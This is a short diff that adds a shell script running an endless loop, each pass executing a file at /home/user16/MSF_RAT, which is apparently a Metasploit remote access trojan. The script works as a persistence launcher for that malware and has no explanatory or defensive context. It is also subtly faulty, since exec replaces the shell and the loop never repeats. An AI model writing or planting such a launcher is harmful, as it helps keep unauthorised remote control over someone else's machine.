@@ -1,0 +1,5 @@
+#!/bin/sh
+while true
+do
+	exec /home/user16/MSF_RAT 
+done
